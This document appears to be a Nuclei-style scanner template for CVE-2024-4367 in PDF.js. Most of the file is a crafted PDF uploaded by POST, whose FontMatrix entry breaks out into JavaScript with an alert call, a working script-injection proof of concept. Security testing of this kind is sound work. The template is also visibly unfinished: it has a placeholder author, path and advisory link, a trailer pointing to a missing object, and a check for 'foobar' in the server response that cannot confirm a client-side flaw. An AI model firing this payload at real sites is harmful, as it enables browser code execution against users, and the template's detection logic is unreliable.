id: CVE-2024-4367-pdfjs-code-execution

info:
  name: CVE-2024-4367 Arbitrary JavaScript Execution in PDF.js
  author: yourname
  severity: critical
  description: Checks if an application using PDF.js is vulnerable to arbitrary JavaScript execution through malicious PDF file uploads.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4367
    - https://www.mozilla.org/security/advisories/mfsa2023-xx/
  tags: cve,cve2024,pdfjs,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/path-to-pdf-renderer-or-uploader"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PDF.js Version"
          - "Upload PDF"
        part: body

      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/path-to-pdf-renderer-or-uploader"
    body: |
      ------WebKitFormBoundaryePkpFF7tjBAqx29L
      Content-Disposition: form-data; name="file"; filename="malicious.pdf"
      Content-Type: application/pdf
      
      %PDF-1.4
      1 0 obj
      <<
        /Type /Font
        /Subtype /Type1
        /FontDescriptor 2 0 R
        /BaseFont /FooBarFont
        /FontMatrix [1 2 3 4 5 (0\); alert('foobar')]
      >>
      endobj
      2 0 obj
      <<
        /Type /FontDescriptor
        /FontName /FooBarFont
        /ItalicAngle 0
        /Flags 4
      >>
      endobj
      3 0 obj
      <<
        /Type /Page
        /Parent 4 0 R
        /Resources << /Font << /F1 1 0 R >> >>
        /Contents 5 0 R
      >>
      endobj
      4 0 obj
      << /Type /Pages /Kids [3 0 R] /Count 1 >>
      endobj
      5 0 obj
      << /Length 44 >>
      stream
      BT
      /F1 24 Tf
      100 700 Td
      (Hello, World!) Tj
      ET
      endstream
      endobj
      xref
      0 6
      0000000000 65535 f 
      0000000010 00000 n 
      0000000077 00000 n 
      0000000129 00000 n 
      0000000220 00000 n 
      0000000282 00000 n 
      trailer
      << /Root 6 0 R >>
      startxref
      354
      %%EOF
      
      ------WebKitFormBoundaryePkpFF7tjBAqx29L--
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryePkpFF7tjBAqx29L

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "foobar"
        part: body

      - type: status
        status:
          - 200

